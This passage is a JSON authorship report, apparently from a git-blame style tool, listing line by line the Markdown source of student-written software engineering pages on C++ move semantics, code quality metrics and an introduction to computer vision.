        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": "As shown above, the *move* constructor defines each of its parameter to be Rvalue References. In this case, if the constructor is called using a mixture of both lvalues and rvalues, such as lvalue for `x` and rvalue for `y`, the copy constructor instead will be called! This is because the *copy* constructor is able to accept both lvalues and rvalues, while the *move* constructor is only able to accept rvalues. As such, we may think we have made use of Move Semantics to optimize our program, but that may not be the case!"
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": "One solution to this problem would be to overload the constructor for each combination of Rvalue Reference parameters possible, like this:"
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": "```cpp"
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": "Foo(const std::string\u0026 x, const std::string\u0026 y) { // copy constructor"
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": "    _x \u003d x;"
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": "    _y \u003d y;"
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": "Foo(std::string\u0026\u0026 x, const std::string\u0026 y) { // move constructor 1"
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": "    _x \u003d x;"
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": "    _y \u003d y;"
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": "Foo(const std::string\u0026 x, std::string\u0026\u0026 y) { // move constructor 2"
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": "    _x \u003d x;"
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": "    _y \u003d y;"
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": "Foo(std::string\u0026\u0026 x, std::string\u0026\u0026 y) { // move constructor 3"
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": "    _x \u003d x;"
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": "    _y \u003d y;"
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": "However, this is not feasible as we would require `2^n` overload functions, where `n` is the number of parameters. This results increased [boilerplate code](https://www.quora.com/What-is-boilerplate-code), which in turn reduces code quality, increases memory consumption and compilation time."
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": "Rather, what should be provided here is:"
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": "```cpp"
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": "Foo(std::string x, std::string y) { // move constructor"
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": "    _x \u003d std::move(x);"
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": "    _y \u003d std::move(y);"
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": "Yes, revert back to using the old Value Semantics type constructor instead! By doing so, it is now up to the caller to decide whether they want to have an additional copy by calling this constructor with `Foo(x,y)`, or to prevent the additional copy by calling `Foo(std::move(x), std::move(y))`, depending on which value is no longer needed."
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "-"
        },
        "content": "## Resources"
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "-"
        },
        "content": "The following resources gives more readings on what was discussed, and a more in-depth tutorial on Rvalue References and Move Semantics:"
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "-"
        },
        "content": "* [Biggest and important changes in C++11](https://blog.smartbear.com/development/the-biggest-changes-in-c11-and-why-you-should-care/)"
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "-"
        },
        "content": "* [Why Value Semantics is good to use](https://akrzemi1.wordpress.com/2012/02/03/value-semantics/)"
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* [Comparison on pass-by-value or pass-by-reference](https://www.informit.com/articles/article.aspx?p\u003d2731935\u0026seqNum\u003d18)"
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* [Tutorial on what is a rvalue and what is a lvalue](https://www.bogotobogo.com/cplusplus/C11/4_C11_Rvalue_Lvalue.php)"
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* [Tutorial on using Rvalue References and Move Semantics](https://www.bogotobogo.com/cplusplus/C11/5_C11_Move_Semantics_Rvalue_Reference.php)"
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "-"
        },
        "content": "* [C++ Rvalue References Explained in 11 Sections](http://thbecker.net/articles/rvalue_references/section_01.html)"
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* [Sample examples of using Rvalue References and Move Semantics](https://www.bogotobogo.com/cplusplus/C11/5B_C11_Move_Semantics_Rvalue_Reference.php)"
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* [The Rvalue Reference Anti-Pattern](https://cpptruths.blogspot.sg/2012/03/rvalue-references-in-constructor-when.html)"
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "jamessspanggg": 10,
      "iskandarzulkarnaien": 4,
      "-": 174
    }
  },
  {
    "path": "contents/codeQuality/CodeQualityMetrics.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Code Quality Metrics"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Code Quality Metrics"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Authors: [Wilson Kurniawan](https://github.com/wkurniawan07)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": "## Overview"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "-"
        },
        "content": "- It is undisputed that developers, code reviewers, testers, QA team members, and software architects alike want code to be as simple, understandable, and (put more positive adjectives here) as possible."
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "-"
        },
        "content": "- It is, however, disputable how \"simple\", \"understandable\", etc. is defined, because they are all qualitative. What is \"...\" for one person may not be so \"...\" for another; in fact, it may not be so for that person three months later."
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "-"
        },
        "content": "A quantitative approach needs to be adopted to measure those qualities precisely. **Code Quality Metrics** is the answer. It provides a **quantitative measure** of the quality of a piece of code."
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e Since quantitative measurements are essential in all sciences, there is a continuous effort by computer science practitioners and theoreticians to bring similar approaches to software development."
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e The goal is obtaining objective, reproducible and quantifiable measurements, which may have numerous valuable applications in schedule and budget planning, cost estimation, quality assurance testing, software debugging, software performance optimization, and optimal personnel task assignments."
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e https://en.wikibooks.org/wiki/Introduction_to_Software_Engineering/Quality/Metrics"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": "In fact, [the Boeing 777 project attributed its success to excellent usage of Quality Metrics (both code and non-code)](https://thesai.org/Downloads/Volume3No1/Paper%2021-Survey%20on%20Impact%20of%20Software%20Metrics%20on%20Software%20Quality.pdf)."
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "*Note that the term \"Code Quality\" here is scoped to be the readability, understandability, and maintainability of the code. While performance can be considered a legitimate basis for some metrics (e.g. time taken to run certain operations, based on profiling), it is not considered for this purpose.*"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "## Examples of Metrics"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "### Complexity Metrics"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": "Complexity metrics measure how \"complex\" methods, classes, packages, etc. are. \"Complex\" here is defined as difficult to understand and difficult to maintain."
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "They are arguably the most useful metrics for the largest number of developers because they are the easiest to grasp, the most directly relevant to the coding activity, and applicable to most/all programming languages."
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "- The most well-known complexity metric is **Cyclomatic Complexity (CC)**, invented by Thomas McCabe in 1976. CC corresponds to the **minimum number of test cases needed to achieve 100% branch coverage**. [Here](http://www.whiteboxtest.com/cyclomatic-complexity.php) is an excellent explanation on how to make use of it to measure your code quality."
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "- An alternative, less well-known, harder to calculate complexity metric is **NPath Complexity (NC)**, invented by Brian A. Nejmeh in 1988. NC corresponds to the **minimum number of test cases needed to achieve 100% path coverage**."
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "\u003e [Here](http://www.literateprogramming.com/mccabe.pdf) is the original paper by McCabe, and [here](https://dl.acm.org/citation.cfm?doid\u003d42372.42379) is the original paper by Nejmeh."
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "These complexity metrics can be extended to class level (e.g. summing or averaging the complexity values of all methods in a class), package level, or even project level."
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "### Class Design Metrics"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "Class design metrics measure how \"well-designed\" a class is. \"Well-designed\" here is defined as conformance to good software engineering principles such as high cohesion, low coupling, promoting encapsulation and information hiding. Well-designed classes promote reuse and ease maintenance effort."
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "Metrics on this level are more applicable for QA team members and software architects, but still hold some relevance to students and junior developers who have to design a class-level API."
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "The most well-accepted metrics for class design are [**The Chidamber and Kemerer Metrics**](http://www.virtualmachinery.com/sidebar3.htm):"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "- Weighted Methods per Class (WMC)"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "- Coupling Between Objects (CBO)"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "- Response For Class (RFC)"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "- Lack of Cohesion of Methods (LCOM)"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "- Depth of Inheritance Tree (DIT)"
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "- Number of Children (NOC)"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "### Package Design Metrics"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "Package design metrics measure how \"well-designed\" a package is. \"Well-designed\" here is similarly defined as the one in class design metrics. Metrics on this level are mostly applicable only for QA team members and software architects."
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "The most well-accepted metrics for package design are [**\"the group of five\"**](http://www.virtualmachinery.com/jhawkmetricssyspack.htm):"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "- Afferent Coupling (Ca)"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "- Efferent Coupling (Ce)"
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "- Instability (I)"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "- Abstractness (A)"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "- Distance from Main Sequence (D)"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "### Seemingly Trivial Metrics"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "The previous sections have introduced mostly new concepts that are foreign to many developers."
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "However, measures that are seemingly trivial and easy-to-overlook can also count as metrics, such as the following:"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "- Number of lines of codes in a class/method/..."
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "- Number of methods in a class"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "- Number of fields in a class"
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "- Number of parameters in a method"
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "- Nesting depth of a method"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "- Code coverage"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "- Percentage of comments"
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "- Percentage of code duplication"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "## Define Your Own Metric"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "You would have noticed that these metrics are self-formulated rather than being inherent properties of a piece of software, and you are right."
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "You might then ask: can I define my own code quality metric? Yes, you can. [This page](https://www.developer.com/tech/article.php/3644656/Software-Quality-Metrics.htm) has a good guide on how to formulate your own metric."
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "## Making Sense of It"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "Any code quality metric is as good as how it is used; without context, it is merely a number. **Do not** use any metric just for the sake of it."
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "- It makes little sense to say: \"This method has a CC value of 42. It is bad.\""
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "- It makes more sense to say: \"This method has a CC value of 42. That means we need at least 42 test cases to achieve full branch coverage for it, and it is bad.\""
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "- It makes the most sense to say: \"This method has a CC value of 42. That means we need at least 42 test cases to achieve full branch coverage for it. This indicates an overly complex method, and it will be difficult to maintain in the long run. Try to separate it to calls of a few methods of CC value of 10 or less each; that way we can better design test cases for those smaller methods and achieve perfect coverage.\""
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "[Here](https://homepages.dcc.ufmg.br/~figueiredo/disciplinas/lectures/detection-strategy-examples_v01.pdf) is an excellent example of how different metrics are used to determine which classes/methods need some maintenance works."
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "## Code Quality Metrics Tools"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "Measuring complexity (relevant to most developers):"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "- Java: [PMD](https://pmd.github.io)"
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- JavaScript: [ESLint](https://eslint.org)"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "- C#: [Visual Studio Code Analysis](https://blogs.msdn.microsoft.com/zainnab/2011/05/17/code-metrics-cyclomatic-complexity/)"
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "- Python: [radon](https://pypi.python.org/pypi/radon)"
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- Ruby: [RuboCop](https://batsov.com/rubocop/)"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "- PHP: [PHPMD](https://phpmd.org)"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "Measuring design (relevant to architects, QA team), most of them commercial:"
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- Java: [JArchitect](https://www.jarchitect.com)"
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- C#: [NDepend](https://www.ndepend.com)"
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "- PHP: [PHP Depend](https://pdepend.org)"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "jamessspanggg": 7,
      "-": 110
    }
  },
  {
    "path": "contents/computerVision/cv.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Introduction to computer vision (CV)"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "# Introduction to Computer Vision (CV)"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": "Authors: [Nguyen Quoc Bao](https://github.com/bqnguyen94)"
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [What is Computer Vision‎](#what-is-computer-vision)"
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Applications of Computer Vision‎](#applications-of-computer-vision)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Typical Computer Vision tasks‎](#typical-computer-vision-tasks)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Core problems in Computer Vision‎](#core-problems-in-computer-vision)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Image Transformations‎](#image-transformations)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Image Classification‎](#image-classification)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Object Detection‎](#object-detection)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Object Tracking‎](#object-tracking)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [GPU-accelerated Computer Vision‎](#gpu-accelerated-computer-vision)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [What\u0027s next‎](#what-s-next)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [References‎](#references)"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## What is Computer Vision?"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "Computer vision (CV) is a field of study of computer science concerning with the theories and technologies in building computer systems that can derive useful information from visual data. CV is a prominent field of study nowadays as it allows computers to autonomously solve problems that otherwise require human sight.\u003csup\u003e[[1]](#footnote1)\u003c/sup\u003e One notable example of such problems can be seen in smart traffic cameras that can extract car plates information from video feeds, a task that without computer vision would require a human to view the feeds and manually enter the cars\u0027 license numbers.\u003csup\u003e[[14]](#footnote14)\u003c/sup\u003e"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": "In computer vision, an image is represented by a number matrix, or a set of matrices, with each number in the matrix corresponds to the color value or intensity value of a pixel in the image.\u003csup\u003e[[2]](#footnote2)\u003c/sup\u003e With this representation, linear algebra can be exploited for many CV operations from the most basic like transformation to very complex like feature extraction and motion tracking."
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "Additionally, with deep learning, a lot of new applications of computer vision have been introduced, including facial recognition, and object detection that is widely used in self-driving cars.\u003csup\u003e[[3]](#footnote3)\u003c/sup\u003e"
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Applications of Computer Vision"
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "Many systems and applications rely on computer vision, as they work extensively with image and video input for:"
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "- Navigation, e.g. autonomous cars to keep track of the road, detect pedestrians, and avoid collision with other vehicles.\u003csup\u003e[[3]](#footnote3)\u003c/sup\u003e"
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "- Facial Detection, e.g. smartphones\u0027 camera software to focus on faces.\u003csup\u003e[[4]](#footnote4)\u003c/sup\u003e"
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "- Visual Surveillance, e.g. detecting movements in security footage.\u003csup\u003e[[4]](#footnote4)\u003c/sup\u003e"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "- Automatic Inspection, e.g. measuring structures, modelling environment.\u003csup\u003e[[4]](#footnote4)\u003c/sup\u003e"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "- Searching, e.g. image search engines.\u003csup\u003e[[5]](#footnote5)\u003c/sup\u003e"
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Typical Computer Vision Tasks"
      },
